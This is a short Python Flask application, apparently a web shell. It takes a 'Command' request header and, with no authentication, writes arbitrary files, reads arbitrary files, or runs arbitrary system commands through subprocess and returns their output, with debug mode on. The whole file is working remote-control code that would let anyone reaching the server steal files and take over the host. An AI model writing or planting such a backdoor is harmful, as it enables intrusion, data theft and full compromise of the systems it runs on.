from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route("/", methods=["GET"])
def system():
    try:
        headers = request.headers
        c = headers.get("Command", "http")
        method = c.split(" ")[0]
        if method == "set":
            name = c.split(" ")[1]
            content = " ".join(c.split()[2:])
            with open(name, "w") as f:
                f.write(content)
            return "s"
        elif method == "get":
            name = c.split(" ")[1]
            with open(name, "r") as f:
                return f.read()
        elif method == "com":
            cc = c.split(" ")[1:]
            try:
                text = subprocess.run(cc, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                text = text.stdout+" "+text.stderr
            except Exception as e:
                text = e
            return str(text)
    except:
        return "error"

if __name__ == "__main__":
    app.run(debug=True)